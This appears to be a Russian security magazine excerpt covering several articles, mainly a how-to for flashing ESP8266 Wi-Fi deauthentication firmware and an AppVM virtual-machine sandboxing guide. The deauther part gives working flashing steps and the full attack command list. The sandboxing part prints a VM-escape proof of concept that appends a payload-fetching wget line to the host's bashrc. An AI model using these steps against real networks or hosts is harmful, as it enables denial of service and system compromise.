Уязвимости в API во мно гом подчиня ются тем же правилам, что и на сайтах,
но потенциальный импакт у них куда шире: уяз вимые запросы могут исполь‐
зоваться как на сайтах, так и в мобильных приложениях, и даже в десктопных
программах.
  Искать ошибки в них, конечно же, можно привычными инструментами вро‐
де больших комбайнов — все‐таки это веб, — но чаще это удобнее делать
более специализированными инс тру ментами. Гем Fuzzer — это биб лиотека
на Ruby, которая помогает авто матизировать поиск различных типов багов
из OWASP 10. Она удоб на, проста в экс плуатации и уме ет искать традици‐
онные XSS, SQLi, XXE, опенредиректы и мно гое другое. К сожале нию, не всег‐
да удобно тыкаться к irb или писать на каждый чих свой наколе ночный скрипт.
  К счастью, команда Fuzzapi раз вива ет GUI для API‐fuzzer. Технически
это простое приложение на Rails, которое имеет в зависимостях API‐fuzzer
и позволяет через рельсовый сервер запус кать сканы в удобном интерфейсе,
а потом строить отче ты и прос матривать историю ска нов.





  Fuzzapi в процессе тес тирова ния эндпой нта
  http://app:9091/api/v1/posts/search

Кстати, чтобы не возиться с зависимос тями и ИС для приложения, раз работ‐
чики предоставляют docker‐compose‐файл со всем необходимым.
  А на сегодня все. Спасибо, что дочитал!
ВЗЛОМ





                                         Илья Рыжов
                                                    il.ryzhov@yandex.ru
    ГАСИ
   ВОЛНУ!
            ВЫБИРАЕМ
         И НАСТРАИВАЕМ
           АППАРАТНЫЙ
         ДЕАУТЕНТИФИКАТОР
               WI‐FI НА ESP8266





Wi‐Fi jammer, или глушилка Wi‐Fi, — это гаджет, который
предназначен  для  отключения  беспро водных  устройств
от хотспота. Зачем это нужно? Можешь вообразить себе
как дружеский розыгрыш (сосед, конечно, обрадуется, когда
ты оборвешь его порноролик или, нап ример, футбольный
матч на самом интересном месте), так и криминальное при‐
менение: злоумышленник может отключить от сети камеры
слежения или другое важное обо рудо вание. В этой статье
мы разберем, какие есть недоро гие варианты аппаратных
деаутентификаторов, как ими пользоваться и как защититься
от подобных атак.


КАК РАБОТАЕТ «ГЛУШИЛКА»
В отличие от настоящих глушилок, которые перебивают сигнал радиопе‐
редатчика своим более силь ным сигналом, деаутентификатор работает
на программном уровне. Он реализует ата ку типа «отказ в обслуживании»,
отправляя на роутер фрейм деаутентифика ции от имени подключенных к сети
устройств. Поскольку этот фрейм никак не шифруется, глушилке достаточно
выведать MAC‐адреса устройств, поснифав трафик в сети.
  Обычно деаутентификация — это часть комплексной атаки на сеть. Она
используется при создании «зло го двойника» точки доступа либо для перех‐
вата хендшейка, что затем поз воляет расшифровать пароль. Однако глушил‐
ка может быть полезной и сама по себе.


           WARNING

                     Все   рассмотренные   советы   настоятельно
                      рекомендуется использовать только в образова‐
                         тельных  целях.  Бло кировка  передачи  данных
                      и использование рассмотренных средств может
                      преследоваться по закону. Для проведения тес‐
                        тов на проник новение требует ся получить соот‐
                        ветствующее письмен ное подтверждение заказ‐
                          чика. Помни, что данные о деавторизации сох‐
                       раняются в логах роутера.


В последнее время большую популярность приобре ли недорогие и мини‐
атюрные платы с поддержкой прог раммной платформы NodeMCU. Они пос‐
троены на модуле ESP8266, который реализует работу с Wi‐Fi по стандарту
802.11b/g/n на частоте 2,4 ГГц . Сейчас встречается два варианта подобных
плат: с чипом CP2102 американской компании Silicon Labs или с китайским
CH340.





                       Версии NodeMCU

Эти платы позиционируются как устройства для прототипирования: на их
основе умельцы создают авто матизированные сис темы, управля емые по Wi‐
Fi. Тема сама по себе довольно захватывающая, но нас сей час интересует
другое — возможность использования NodeMCU для проведения атак.
  Для полноцен ного мониторинга и инъекции пакетов ESP8266 непригоден
в силу технических ограничений, одна ко его мож но использовать в качестве
деаутентификатора — что и привело к появлению соответствующих про‐
шивок. В прошлом году хороший человек с псевдонимом Spacehuhn зарели‐
зил первую из них, но с тех пор появились и дру гие версии — с допол нитель‐
ными возможностями. Впрочем, прежде чем переходить к соф ту, определим‐
ся с выбором железа.


             INFO

                      Если ты выбираешь более серьезное оборудо‐
                       вание для вардрайвин га — с режимом мониторин‐
                          га и, может быть, даже возможностью проводить
                       MiTM‐атаки в сети, — то ознакомься с нашим
                    прошлогодним FAQ по выбору инструментария
                       для работы с беспроводными сетями.


Я буду демонстрировать процесс на при мере пла ты китайского производите‐
ля Dstike: на ней стоит ESP8266 и есть режимы работы в качес тве клиента
(P2P) и точки доступа (soft‐AP). Управлять пла той можно со смартфона
или любого другого устройства с Wi‐Fi.
  Отмечу, что работоспособ ность программного обеспечения не зависит
ни от чипа, ни от платы — ты можешь выб рать любой вари ант по своему
усмотрению. Одних только продуктов Dstike нес коль ко вариантов в разном
исполнении и для использования в разных ситуациях. Все их объединяет
одно — возможность глушить сети.


                          DstikeРаз новид ности устрой ств
Deauther  Wristband — брас лет со встро енным диспле ем, батаре ей
и переключателем. Удобное устройство для быс трого доступа к панели
управления.





                     Пор тативный Jammer

Deauther Power Bank — с модифицированным контроллером заряда;
управление осуществляется через специальную панель. На контроллере есть
разъем для подключения внешней антенны. Аккумуля торы в комплект не вхо‐
дят. Это незаметное устройство, которое можно с легкостью оставить
где‐нибудь и использовать уда ленно.





                             Power bank





                        Контроллер заряда

Deauther OLED V3.5 — в этом варианте ты дополнительно получишь разъ‐
ем для подклю чения внешней антенны и держатель для  акку мулятора
на 18650 мА ⋅ ч. Управля ется устройство при помощи кнопок и переключате‐
ля, а вывод поступает на экран, что поз воляет использовать этот вариант
без дополнительного обо рудования.





                     Готовый jammer с экраном



Главное преимущество этих гаджетов — в воз можнос ти выбора определен‐
ной сети или всех сразу в радиусе действия устройства. Отме чу на всякий
случай, что для проведения атак пароль от Wi‐Fi не пот ребуется! :‐)


УСТАНОВКА DEAUTHER 2.0
Начнем с Deauther 2.0 — той самой прошивки, которую разработал Space‐
huhn. В его репозитории на GitHub ты можешь выб рать версию для конкрет‐
ной платы.
  Файлы с расширением bin — это скомпилированные скетчи. Их нужно
устанавливать на плату через специаль ный заг рузчик. Но если захочешь, то
в архивах с исходным кодом ты отыщешь биб лиотеки и скетчи, которые мож‐
но поставить через Arduino IDE.


Загрузка .bin
Если ты выбрал вариант с загрузкой бинарника, то для начала запус кай прог‐
рамму NodeMCU Flasher. Скачать ее можно в репозитории NodeMCU.
   Устанавливаем драйверы для CP2102 либо для CH340. Пос ле этого под‐
клю чаем плату  к компьютеру, откры ваем прог рамму NodeMCU  Flasher,
выбираем порт COM в диспетчере устройств в раз деле «Порты (COM и LPT)».
Теперь переходим во вкладку Conﬁg, жмем на шестеренку и выбираем ска‐
чанный файл .bin.





                     Программа для про шивки

После добавления файла в строке слева появится его  путь. Переходи
во вкладку Operation и нажимай на Flash — про шивка после этого будет заг‐
ружена в плату.


Загрузка через Arduino IDE
Если тебе удобнее устанавливать через Arduino IDE, то процесс слегка дру‐
гой. Первым делом точно так же кача ем драйверы (CP2102, CH340). Затем
открываем Arduino IDE и в меню «Файл» ищем «Настрой ки», нажимаем
на «Добавление ссылки для менеджера плат» и вставляем две ссылки:
 • http://arduino.esp8266.com/stable/package_esp8266com_index.json
 • http://phpsecu.re/esp8266/package_deauther_index.json

Все сохраняем.





                     Добавление ссылок

Открываем вкладку «Инс трументы» и выбира ем пункт «Менеджер плат»
из меню «Плата: …».





                      Добавление плат

Выбираем «Вне сены» и устанавлива ем arduino‐esp‐8266‐deauther и es‐
p8266.





                         Ус тановка пакетов

Открываем папку со скет чем и биб лиотеками, переходим в «Инстру менты».
Настройки должны стоять как у меня на скрин шоте.
  В строке «Плата» выбирай из списка ESP8266 Deauther Modules.





                          Заг рузка прошивки

В строке Flash size выбираем свой модуль. Прошивку и объем памяти ставь
как на картинке ниже.





                       Версии модулей

Далее загружаем прошивку.
  После вклю чения плата соз даст  точку дос тупа. Под ключай ся  к ней
и заходи по адресу 192.168.4.1 или deauth.me. Ты попадешь в конфигуратор
и увидишь пре дупреждение.





                       Предупреждение

В разделе конфигурации в строке LANG указываем ru для включения русского
языка в веб‐интерфей се. Что бы нас тройки вступили в силу, нужно нажать
на «Сохранить» и перезагрузить устройство. Теперь оно готово к работе,
можно начинать портить жизнь соседям.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
        ГАСИ ВОЛНУ!
           ВЫБИРАЕМ И НАСТРАИВАЕМ АППАРАТНЫЙ
               ДЕАУТЕНТИФИКАТОР WI‐FI НА ESP8266





ОБЗОР ВОЗМОЖНОСТЕЙ И НАСТРОЙКИ
Давай быстро прой демся по приложению и пос мотрим, на что теперь спо‐
собна наша платка.





                          Нас трой ки

Если подключить глушилку по последова тельному порту, то с помощью
команд можно управлять джеммером. Эту функцию можно отключить в нас‐
тройках, если убрать галочку SERIAL.


Коман ды для управле ния по пос ледова тель ному пор ту
 • scan  [<all/aps/stations>]  [t  <time>]  [c  <continue
  time>] [ch <channel>]
 • show [selected] [<all/aps/stations/names/ssids>]
 • select [<all/aps/stations/names>] [<id>]
 • deselect [<all/aps/stations/names>] [<id>]
 • add ssid <ssid> [wpa2] [cl <clones>]
 • add ssid ap <id> [cl <clones>] [f]
 • add ssid s [f]
 • add name <name> [ap <id>] [s]
 • add name <name> [st <id>] [s]
 • add name <name> [m <mac>] [ch <channel>] [b <bssid>] [
  s]
 • set name <id> <newname>
 • enable random <interval>
 • disable random
 • load [<all/ssids/names/settings>] [<file>]
 • save [<all/ssids/names/settings>] [<file>]
 • remove <ap/station/name/ssid> <id>
 • remove <ap/station/names/ssids> [all]
 • attack [beacon] [deauth] [deauthall] [probe] [nooutput] [
  t <timeout>]
 • attack status [<on/off>]
 • stop <all/scan/attack>
 • sysinfo
 • clear
 • format
 • print <file> [<lines>]
 • delete <file> [<lineFrom>] [<lineTo>]
 • replace <file> <line> <newcontent>
 • copy <file> <newfile>
 • rename <file> <newfile>
 • run <file>
 • write <file> <commands>
 • get <setting>
 • set <setting> <value>
 • reset
 • chicken
 • reboot
 • info
 • // <comments>
 • send deauth <apMac> <stMac> <rason> <channel>
 • send beacon <mac> <ssid> <ch> [wpa2]
 • send probe <mac> <ssid> <ch>
 • led <r> <g> <b> [<brightness>]
 • led <#rrggbb> [<brightness>]
 • led <enable/disable>
 • draw
 • screen <on/off>
 • screen mode <menu/packetmonitor/buttontest/loading>



Через 600 секунд после начала атак они автомати чески прекратятся. Если
не хочешь, чтобы это происходило, то можешь вручную настроить отключение
по времени, задав значение в меню ATTACKTIMEOUT: укажи 0, и атаки перес‐
танут автоматически отключать ся.
   Если в разделе сканирования нажать Scan APs, то глушилка находит все
точки доступа Wi‐Fi. Выбираешь одну или нес коль ко сетей, и можно перехо‐
дить в раздел атак. Режим Deauth отключает все устройства от выбранной
сети. Режим Beacon позволяет соз давать одновременно до 60 точек дос‐
тупа.





                     Сканирование и виды атак

В разделе SSIDs создаются точки доступа для атаки Beacon.





                     Создание точек дос тупа

В прошивке предусмотрена возможность подклю чения дисплея — для вер‐
сии устройства с ним. Но при желании ты можешь и сам припаять к плате
экран и кнопки, а также обеспечить авто номное питание, чтобы превратить ее
в независимое устрой ство.
   Также разработчики прошивки, помимо самого джеммера, продают
и устройство, которое позволяет его обна руживать.





                         Детектор

Авторы периодически обновляют прошивку и добавляют новые функции, так
что следи за апдейтами!


WI-PWN
Рассмотрим аналогич ную прошивку Wi‐PWN, которую разработал Сэм Денти
(samdenty99). Он улучшил творение Spacehuhn и добавил функции детектора
деаутентификации, а также соз дал сопутс твующее приложение для Android.
В итоге использовать Wi‐PWN удобнее, чем Deauther 2.0.
  После скачивания и распаковки архи ва пот ребуется прошить плату и уста‐
новить приложение на телефон. В папке ты найдешь программу ES‐
P8266Flasher. Запусти ее, выбирай COM‐порт и в разделе Conﬁg — прошивку
(она находится по пути *\Wi‐PWN‐master\arduino\Wi‐PWN). Теперь жми
Flash во вкладке Operation.
  С телефона подключаемся к плате по Wi‐Fi.





                             Сеть Wi‐Fi

Открываем скачанное приложение, соглашаемся с правилами, указываем
имя и пароль сети. После настройки подключаемся к новому Wi‐Fi.





           Настрой ка точки доступа и завершение установки

В приложении есть несколько вкладок с говоря щими названиями:
 • Scan — раздел с поис ком и выбором нескольких точек доступа;
 • Users — функция сканирования определен ного Wi‐Fi на наличие подклю‐
   чений и создание собс твенных «пользователей»;
 • Attack — атаки ана логичны версии Spacehuhn, но при клонировании
   сетей максимальное чис ло пользователей — 48 вместо 60 (столько было
   в ранних версиях Deauther);
 • Detector — функция, которая позволяет ска нировать каналы и опре‐
   делять глушилки;
 • Settings — настройка сервера Wi‐Fi (имя, пароль сети). Здесь же можно
   вклю чить клиент Wi‐Fi и нас троить парамет ры сканирования и атаки.


           WARNING

                     Для стабильной работы устройства рекомендую
                       прикрепить радиатор к греющейся части устрой‐
                          ства. В противном случае джеммер может перег‐
                        реться и вык лючиться.



ПАРА СЛОВ О ЗАЩИТЕ
NodeMCU — это дешевое, универ сальное, мощ ное и компактное решение
для деаутентификации. Повторить весь проект можно быстро и без особых
усилий. А раз это может сделать кто угодно, то неплохо подумать и о защите.
   Большинство   популярных   роутеров  исполь зуют   стандарты   IEEE
802.11b/g/n, которые подвержены глушению. Если хочешь исключить такую
вероятность, то ищи роутер с поддержкой стандарта 802.11w, который пол‐
ностью защищает пользователей от этой ата ки.
  В некоторых роутерах есть защита от спа ма, но она работает только с под‐
клю ченными к сети устройства ми, а Wi‐Fi jammer к сети не подключается.
Если у твоего роуте ра есть защита от спа ма, которая работает и с непод клю‐
ченными устройствами, то советую ее активировать!


        WWW

                     Подборка полезностей для работы с ESP8266,
                     любовно собранная Олегом Куп реевым
ПРИВАТНОСТЬ


    ВСЕ ПО
 ПЕСОЧНИЦАМ!
       ЗАПУСКАЕМ ПРИЛОЖЕНИЯ
      В ОТДЕЛЬНЫХ ВИРТУАЛКАХ
        С ПОМОЩЬЮ APPVM





                                             dump_stack()





Если ты действительно заботишься о безопасности, то
некоторые приложения есть смысл запус кать в виртуали‐
зации. Обычно это создает массу проблем: держать три
десятка виртуалок неудобно и оста ется соблазн «по‐быстро‐
му» что‐то запус тить на хосте. Мне удалось обойти часть
неудобств. Свое решение я назвал AppVM — оно работает
в Linux и поз воляет запускать приложения с GUI и шейрить
файлы с основной системой; оверхеды при этом минималь‐
ны. Как я этого добился? Сейчас расскажу.


Я действительно люблю Qubes. Если ты с ним не сталкивал ся, поясню:
это дистрибутив, построенный на базе гипервизора Xen, который позволяет
создавать домены — чес тные виртуальные окружения, внутри которых при‐
ложения работают в изо ляции. Ты можешь создавать домены на базе разных
дистрибутивов (образов), и они смо гут общать ся между собой: например,
шейрить файлы. В Qubes доменов может быть сколько угодно: work, personal,
vault — создавай и называй как хочешь. Зву чит неплохо, но есть ли альтер‐
нативы и нужны ли они?
   Если бы не Xen (вместо гипервизора :)) и отсутс твие возможности исполь‐
зовать созданные его раз работчиками утилиты вне окружения дистрибутива,
то я бы им даже поль зовался. Но, на мой взгляд, Xen не под ходит хотя бы тем,
что в отличие от KVM он не в ядре в апс триме. Предлагать кому‐то устанав‐
ливать Xen, только чтобы воспользоваться какой‐то тул зой, — сомнительное
удовольствие. В Qubes самом по себе тоже ничего плохого нет, но его нужно
устанавливать и настраивать. Гораздо проще начать встраивать все хорошее
из Qubes к себе в уютную Gentoo, чем ломать годами отлаженную систему.
  Однако идея безопасности через виртуализацию (security through virtual‐
ization) меня по‐прежнему привлекала, поэтому что‐то нужно было с этим
делать.


Зачем вооб ще исполь зовать Qubes или запус кать при ложе -
ния в отдель ных вир туаль ных машинах?
Конечно же, для повышения безопас ности! Чтобы минимизировать рис ки
заражения через ненадежные прог раммы. Например, ты знал, что любое при‐
ложение, которые ты запус каешь у себя, имеет дос туп ко всем твоим авто‐
ризациям в Chrome на всех сайтах и может слить твои сессии и выполнить
любые действия на любых сайтах от тво его имени? Или получить доступ к тво‐
им файлам. Вот этого я и постарался избежать.


Я покажу, как запускать любые, даже GUI‐приложения в виртуальной машине,
а также шейрить между ними файлы и буфер обмена. Пос леднее — это,
конечно, в теории потенциальная дыра, но жить без этого будет сложновато.
   Чтобы реализовать такую схему работы, я написал AppVM и сейчас
покажу, как с ним обращаться.





  Запущенные в AppVM приложения с GUI. Удобный менеджер запущенных
  приложений с информацией о потребля емой памяти


        WWW

                      Если ты не знаком с Nix, то будет полезно про‐
                         читать  cheatsheet,  который  поможет  понять,
                       каким образом ведется работа в системе. А для
                            тех, кто хочет попробовать NixOS (дистрибутив)
                      или  Nix  (пакетный менеджер, которым можно
                       пользоваться  на любом  дистрибутиве),  будет
                       полезно прочитать другую статью на той же вики.



ИЗ ЧЕГО СТРОИМ
Изначально я видел решение в том, чтобы «собрать виртуальную машину
для каждого приложения». Обернувшись блогами, как теплым клетчатым пле‐
дом, я начал искать готовые скрипты. Но все они мне показались весьма неп‐
ривлекательными — за исклю чением примера, в котором использовался
NixOS. Так и появилась первая версия AppVM, которая, по сути, была
набором скриптов для уста новочного диска.


А как же дру гие сис темы изо ляции?
В чем преимущество по сравнению с использованием SELinux или AppArmor,
а быть может, еще и Firejail или bubblewrap? В лени. Виртуальные машины
не только дают безопасность, их еще и проще использовать. Тебе не нужно
ограничивать доступ к определенным ресурсам сис темы, если их просто нет.


Предельно простой кон фигура ционный файл Nix определил систему:


{config, pkgs, ...}:
{
  imports = [
    <nixpkgs/nixos/modules/installer/cd‐dvd/installation‐cd‐minimal.
nix>
  ];
  environment.systemPackages = with pkgs; [
    chromium
  ];
  services.xserver = {
    enable = true;
    desktopManager.xterm.enable = false;
    displayManager.slim = {
      enable = true;
      defaultUser = "user";
      autoLogin = true;
    };
    displayManager.sessionCommands = "while [ 1 ]; do ${pkgs.
chromium}/bin/chromium; done &";
    windowManager.xmonad.enable = true;
    windowManager.default = "xmonad";
  };
  users.extraUsers.user = {
    isNormalUser = true;
    extraGroups = [ "audio" ];
    createHome = true;
  };
}


РЕШАЕМ ВОПРОС С GUI
Использовать виртуализацию для консольных приложений, конечно, здорово,
но мне бы хотелось в пер вую очередь запускать GUI‐приложения. Например,
недоверенные PDF — ты же прекрасно зна ешь, как дыряв формат PDF
и сколько хитрых спло итов можно через него провернуть, чтобы исполнить
код на целевой системе. Без поддержки GUI смысл AppVM минимален.
  Первым  делом  мне  понадобился  гра фический  сервер  и  какой‐то
минимальный оконный менеджер. Изначально я считал, что самое разумное
решение — написать свою минималис тичную реализацию оконного менед‐
жера, которая будет делать только необходимое. Но, начав работу над этим,
я осознал, что существу ет немало проблем, например с всплывающими окна‐
ми, и небольших особенностей, которых дос таточно для того, чтобы более
жирное, но отлаженное временем решение было предпочтительнее.


             INFO

                    Почему нельзя работать вообще без оконного
                     менед жера на голых «Иксах»? Потому, что многие
                      приложения   хотят   показывать   модальные
                      и дочерние окна. Без хоть какого‐нибудь окон‐
                        ного менеджера они будут работать некорректно.


В качестве временного решения я воспользовал ся xmonad, задействовав
важнейшую фичу каждого тайлового оконного менеджера — воз можность
разворачивать окно на весь экран. А после я осоз нал, что xmonad настолько
незаметен в системе (пот ребляет всего 5 Мбайт с конфигом AppVM), что
разумнее воспользоваться им, а функциональность при необходимости рас‐
ширить.


Почему xmonad
В работе я пробовал мно го оконных менеджеров, но в итоге использую толь‐
ко xmonad, неизменно с середины 2012 года. За это время я не столкнулся
ни с одним багом, ни разу не было падения или каких‐либо проблем, меша‐
ющих работать. В осно ве этой программы — всего три тысячи строк
на Haskell, а если убрать комменты, останется около двух. Для сравнения:
i3wm — около 40 тысяч строк на С, а mutter из проекта GNOME — 150 тысяч
строк. Легковесность победила!


В итоге определенный конфигура ционный файл Nix собирался в ISO:


$ nix‐build '<nixpkgs/nixos>' ‐A config.system.build.isoImage ‐I
nixos‐config=chromium.nix

После чего запускался с помощью QEMU:


$ qemu‐system‐x86_64 ‐smp 2 ‐m 1024 ‐enable‐kvm ‐sandbox on ‐cdrom
result/iso/nixos‐*‐linux.iso

Это работало, и это было хорошо. Но недос таточно. Проблема в том, что каж‐
дое приложение требовало включать в ISO все системные библиоте ки и фай‐
лы, — когда используется одно или два приложения, это еще приемлемо,
но если их пять‐семь, то уже не дос тавляет.
  Решение не заставило себя ждать, и оно при этом уже было частью про‐
екта Nix:


$ head nixos/modules/virtualisation/qemu‐vm.nix
# This module creates a virtual machine from the NixOS configuration.
# Building the `config.system.build.vm' attribute gives you a command
# that starts a KVM/QEMU VM running the NixOS configuration defined in
# `config'. The Nix store is shared read‐only with the host, which
# makes (re)building VMs very efficient. However, it also means you
# can’t reconfigure the guest inside the guest — you need to rebuild
# the VM in the host. On the other hand, the root filesystem is a
# read/writable disk image persistent across VM reboots.

Выглядит как то, что мне и было нужно!
   Как реализовать общее дисковое прос транство, которое будет доступно
для чтения и хостовой системе, и гостевой? Я для этого использовал VirtFS
(Plan 9 folder sharing over Virtio, между прочим) и пробросил через директорию
/nix/store.


Скуч ный 0day с VM escape, который я так и не зарепор тил
Немного опробовав готовое решение в деле, я начал адаптировать его к сво‐
им хотелкам и попутно нашел скучный «0day» — возможность выйти за пре‐
делы VM. Как видно в описании модуля, Nix store (суть которого — директория
/nix) расшаривается с гос тевой ОС. Тут‐то собака и оказалась зарыта.


 # Start QEMU
 exec ${qemuBinary qemu} \
     ‐name ${vmName} \
     ‐m ${toString config.virtualisation.memorySize} \
     ‐smp ${toString config.virtualisation.cores} \
     ‐device virtio‐rng‐pci \
     ${concatStringsSep " " config.virtualisation.qemu.networ
 kingOptions} \
     ‐virtfs local,path=/nix/store,security_model=none,mount_tag=
 store \
     ‐virtfs local,path=$TMPDIR/xchg,security_model=none,mount_tag=
 xchg \
     ‐virtfs local,path=''${SHARED_DIR:‐$TMPDIR/xchg},security_model=
 none,mount_tag=shared \
 ...


Можно было бы подумать: «Ага! security_model=none!», но нет. Они забыли
добавить опцию readonly, тем самым сведя выход из виртуальной машины
всего к двум действиям:


 mount ‐o remount,rw /nix/store
 echo 'wget https://172.16.81.100/payload && ./payload' >> /nix/
 store/*/etc/bashrc


Подробнее об опциях VirtFS можно прочитать в вики QEMU.



КАК ХРАНИТЬ ДАННЫЕ?
Вернемся к нашим костылям реализации. На данный момент у нас уже есть
виртуальная машина,  в  которой  запус кается  нужное нам приложение
и которая использует директорию /nix/store, проб рошенную с хоста. В ито‐
ге виртуальная машина почти не занимает мес та на жес тком диске. Nix store,
безусловно, занимает весь ма много (так как содержит все основные сис‐
темные пакеты), но эту проб лему прос тым спо собом уже не решить. Благо
в одном экземпляре это не сос тавляет проблемы.
   У меня в качестве хра нилища файлов конфигура ции использовал ся диск
qcow2, подключенный в режиме writeback. Туда и записы валась разница меж‐
ду исходной запущенной системой и внесенными изменениями. Проблема
такого подхода проявилась очень быс тро, а если точнее — после первого же
обновления: при исполь зовании дисков в режиме «писать только разницу»
обновить базовую систему не получится, так как она в этом случае будет дру‐
гой.
   Тогда я принял решение проб расывать через VirtFS директорию гостя
/home/user на хост точно так же, как и /nix/store . Таким образом получи‐
лось и хранилище файлов, и одновременно shared directory.


ПОДКЛЮЧАЕМ LIBVIRT И РАЗБИРАЕМСЯ С ПРАВАМИ
Тут стало понятно, что запуск QEMU из терминала недостаточно удобен, так
как приложения «теряются». Нужно либо убивать их руками (звучит пугающе, я
знаю), либо написать обертку, которая будет следить за ними. Это при вело
меня к libvirt.


             INFO

                     Для тех, кто не сталкивался с libvirt, поясню, что
                        это такое. Эта библиоте ка обеспечивает простую
                       возможность управления виртуальными машина‐
                    ми как из терминала, так и из GUI (virt‐manager)
                      и при этом поддерживает разные системы вир‐
                        туализации   (как   слой   абстракции).  Одна
                       из полезных особенностей — то, что при исполь‐
                       зовании с QEMU/KVM libvirt в отличие от Virtual‐
                      Box не требует установки дополнительных драй‐
                        веров.


Существует возможность конвертировать командную строку QEMU в опи‐
сание libvirt — это значительно облегчило мне переход. Проблемы прояви‐
лись позже из‐за того, что QEMU начал запускать ся от дру гого пользователя.
  Сначала я пытался решить проб лему стандартными методами, с помощью
ACL и бита sgid (если установить его на директорию, то можно автоматичес ки
присваивать права доступа на созданные файлы вла дельцу директории). Но к
сожалению, QEMU создавал новые файлы на хос товой системе с пра‐
вами 00 для group и other, что меша ет использовать все перечис ленное выше
(или я в чем‐то ошибся, не дойдя до решения).
  Вопреки моим ожиданиям, suid на директорию работает иным образом.
Подробнее об этом можешь почитать в документации проекта GNU для core‐
utils.
  В итоге проще оказалось прос то сменить пользователя libvirt на своего,
тем самым потеряв немного в безопас ности, но приобре тя в юзабилити. Я
просто поменял в /etc/libvirt/qemu.conf пользователя, от имени которо‐
го запускаются вир туальные машины.


КАК АЛЛОЦИРОВАТЬ ПАМЯТЬ
Мне оставалось еще решить проблему с пот реблением памяти. Статичес кое
выделение слабо подходит для большого количес тва приложений, а проект
по автоматическому изменению памяти Automatic Ballooning, к сожалению,
с 2013 года не продвигался. В апстриме этого нет.
  Вооружившись изолентой и костылями, я написал свою реализацию —
безусловно, вре менную (хотя все временное имеет свойство становиться
постоянным). Сложно ее наз вать элегантной, но она, как ни странно, работа‐
ет. Идея до безумия прос та и состоит в соз дании задачи cron в гостевой сис‐
теме.


services.cron = {
  enable = true;
  systemCronJobs = [
    "* * * * *      root    free ‐m | grep Mem | awk '{print $2 \"‐\
" $4}' | bc > /home/user/.memory_used"
  ];
};

Аналогичную задачу создаем и на хосте:


$ crontab ‐l
* * * * * /home/user/bin/appvm autoballoon

Это решение забирает текущее количес тво памяти из виртуальной машины,
добавляет к этому значению 20%, пос ле чего устанавливает полученное зна‐
чение как размер памяти вир туальной машины. В Linux есть поддержка изме‐
нения размера памяти подоб ным обра зом — динамически. Решение, конеч‐
но, далеко от идеала, но оно позволяет нам относительно комфортно
работать.


user@localhost $ appvm autoballoon
+‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐+‐‐‐‐‐‐‐‐‐‐‐‐‐+‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐+‐‐‐‐‐‐‐‐‐‐‐‐+‐‐‐‐‐‐‐‐‐‐‐‐+
| APPLICATION VM | USED MEMORY | CURRENT MEMORY | MAX MEMORY | NEW MEMORY |
+‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐+‐‐‐‐‐‐‐‐‐‐‐‐‐+‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐+‐‐‐‐‐‐‐‐‐‐‐‐+‐‐‐‐‐‐‐‐‐‐‐‐+
| chromium       |      551936 |        1048576 |    2097152 |    1048576 |
| wire           |      932864 |        1119436 |    2097152 |    1119436 |
| torbrowser     |      734208 |        1048576 |    2097152 |    1048576 |
+‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐+‐‐‐‐‐‐‐‐‐‐‐‐‐+‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐+‐‐‐‐‐‐‐‐‐‐‐‐+‐‐‐‐‐‐‐‐‐‐‐‐+

Оставалась проблема с автоматичес ким изменением разрешения экрана,
но ее решить на данный момент так и не уда лось. Если ты сделаешь это быс‐
трее меня, то буду рад получить твой pull request!


ЧТО ПОЛУЧИЛОСЬ
В итоге получилось очень простое решение. Вот что нужно сде лать для стар‐
та.
   Установи пакетный менеджер Nix:


$ sudo mkdir ‐m 0755 /nix && sudo chown $USER /nix
$ curl https://nixos.org/nix/install | sh
$ . ~/.nix‐profile/etc/profile.d/nix.sh

Укажи, что libvirt дол жен работать из‐под нашего пользователя — это нужно
для доступа к расшаренным с виртуалкой фай лам:


$ echo user = "\"$USER\"" | sudo tee ‐a /etc/libvirt/qemu.conf
$ sudo systemctl restart libvirtd

Установи сам AppVM:


$ go get github.com/jollheef/appvm

Обнови:


$ go get ‐u github.com/jollheef/appvm

Сгенерируй разрешение. По умолчанию используется 1920×1080; если нуж‐
но другое, задай его в appvm/nix/monitor.nix:


$ $GOPATH/src/github.com/jollheef/appvm/generate‐resolution.sh 3840
2160 > $GOPATH/src/github.com/jollheef/appvm/nix/monitor.nix

Запускай Chrome:


$ appvm start chromium ‐‐verbose

Подробнее смотри в README.md из репозитория AppVM.
  Подытожу преимущества этого подхода:
 • AppVM использует QEMU;
 • для всех VM исполь зует ся одна директория /nix, и каждое последующее
   приложение в VM не занимает зна чительного пространс тва на дис ке;
 • для управления виртуальными машинами исполь зуется libvirt, для отоб‐
   ражения — virt‐viewer;
 • есть базовая реализация перерас пределения памяти на основе memory
   balloon, что позволя ет уменьшить потребление памяти.

В текущий момент проект имеет ограничение: не поддержи вается автомати‐
ческое изменение разрешения экра на внутри виртуальной машины. При этом
используется автоматическое масшта биро вание в virt‐manager.
  В общем, ставь звездочки репозиторию, подписывайся на мой GitHub, и,
возможно, когда‐то кто‐то обратится ко мне за рекламной интеграцией
в коммиты. Тогда‐то наконец я смогу зарабатывать на open source & free soft‐
ware!
ПРИВАТНОСТЬ

 ПОЛНОДИСКОВОЕ
   ШИФРОВАНИЕ
         С LUKS2
             ИЗУЧАЕМ НОВУЮ ВЕРСИЮ
             ПОПУЛЯРНОГО СРЕДСТВА
            ШИФРОВАНИЯ ДЛЯ LINUX
            И ПРОВЕРЯЕМ, МОЖНО ЛИ
                      ЕГО ВЗЛОМАТЬ





           eakj
     eakj@protonmail.ch





Релиз cryptsetup 2.0 в декабре прошлого года прошел тихо
и незаметно, что довольно‐таки стран но, если вспомнить
фишки, которые он принес. В этой статье мы разберем, что
в нем нового и какие проблемы существуют на данный
момент, на практике попыта емся реализовать полное шиф‐
рование дис ка с использованием LUKS2, а также рассмот‐
рим доступные коммерческие и сво бодные инструменты
для его взлома.


ЗНАЧИМОСТЬ И ПРОБЛЕМА FDE
Дела с шифрованием запоминающих устрой ств обстоят забавным образом:
оно повсюду и нигде одновременно. Начиная от мобильных устрой ств, где
оно играет особо важную роль (причем большинс тво пользовате лей об этом
даже не догадываются), и заканчивая большими дата‐центрами. В то же вре‐
мя исследования, проведенные за пос ледние десять лет в разных странах,
вклю чая Великобританию, Германию и США, показывают, что не только обыч‐
